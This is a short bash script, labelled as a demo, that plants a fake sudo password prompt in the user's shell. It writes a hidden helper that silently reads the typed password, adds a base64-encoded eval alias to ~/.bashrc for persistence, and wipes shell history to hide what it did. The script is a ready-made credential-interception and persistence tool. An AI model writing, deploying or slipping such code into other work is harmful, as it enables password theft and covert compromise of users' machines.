#
# !!!!! THIS IS FOR DEMO PURPOSES ONLY !!!!!
#
# Cleanup: rm -rf ~/.local/share/user-cache/* ~/.bashrc.bak && sed -i '32d' ~/.bashrc

unset HISTFILE && HISTSIZE=0


SECRETDIR="$HOME/.local/share/user-cache/$(uuidgen | cut -c1-8)"
mkdir -p "$SECRETDIR"
LOG_FILE="$SECRETDIR/demoLog"
mkdir -p "$HOME/.local/share/user-cache"

cat <<'EOF' > "$SECRETDIR/auth_helper"
#!/bin/bash
echo -n "[sudo] password for $(whoami): "
read -rs PASS
echo
echo "Timestamp=$(date) | User=$(whoami) | Auth attempt logged" >> "$LOG_FILE"
echo "Sorry, try again."
EOF

chmod +x "$SECRETDIR/auth_helper"

ENCODED_ALIAS=$(echo "alias sudo='$SECRETDIR/auth_helper && command sudo'" | base64 -w0)
OBFUSCATED_LINE="eval \$(echo '$ENCODED_ALIAS' | base64 -d)"

cp ~/.bashrc ~/.bashrc.bak
sed -i "32s/.*/$OBFUSCATED_LINE/" ~/.bashrc

ENCODED_RECOVERY=$(echo "[[ -f '$SECRETDIR/auth_helper' ]] && alias sudo='$SECRETDIR/auth_helper && command sudo'" | base64 -w0)
RECOVERY_LINE="eval \$(echo '$ENCODED_RECOVERY' | base64 -d)"
echo "$RECOVERY_LINE" >> ~/.bashrc
echo "# $(basename "$SECRETDIR")" >> "$HOME/.profile"
grep -v "nohup" ~/.bash_history > /tmp/clean_history
mv /tmp/clean_history ~/.bash_history
history -c && history -r
history -w
